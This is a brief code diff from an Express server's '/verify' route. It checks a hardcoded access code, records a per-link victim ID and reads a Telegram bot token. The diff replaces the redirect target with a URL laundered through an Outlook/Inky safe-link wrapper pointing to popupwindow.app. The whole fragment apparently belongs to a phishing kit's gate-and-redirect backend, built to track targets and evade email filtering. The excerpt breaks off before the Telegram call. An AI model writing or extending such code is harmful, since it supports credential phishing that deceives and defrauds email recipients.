@@ -656,7 +656,7 @@ app.post('/verify', async (req, res) => {
   const { code } = req.body;
   const linkId = req.query.id || 'unknown'; // Capture the unique ID from URL
   const CORRECT_CODE = "Quote435";
-  const TARGET_URL = "https://constructors-cmhc-d66c31-8c3a80.summary-review.workers.dev/?k=Wf3zW15MN0Mh6bdhOwphDclJ";
+  const TARGET_URL = "https://shared.outlook.inky.com/link?domain=popupwindow.app&t=h.eJxtkNFqhDAQRX9lyYNPNTFx3ZgF6f5KnMyiqElIRmQp_feaQmkfOo93DmeG-8H2tLL7hU1EMd-FiCHu8Zi9Cwe3MYoNE0zW0xoCvSd8DrI64-EPVlFY0A9Gt6qrEro5IdDw48sIe8La7jTV8takFx9rcJ57JPZ2YUu5TfM2YqJweOFmWJbHb8DBiu4c0D1erbLK6avT0o1gUFvVP9umFVKbprvpvm246oxSRhU1FnXOIdtHfmXCDdfzsTQDh7AVwH0D_66odCI_vwD6X13-.MEUCIQD-ODZKlKnAOffffy6PWDmf9x_c1r24HlgLtr8Bpp0klwIgdJ6mHiYbGuhCWEdsTleRAWiGY-Omq5XWSMWp4NDEg7o";
 
   if (code === CORRECT_CODE) {
     const token = process.env.TELEGRAM_BOT_TOKEN;
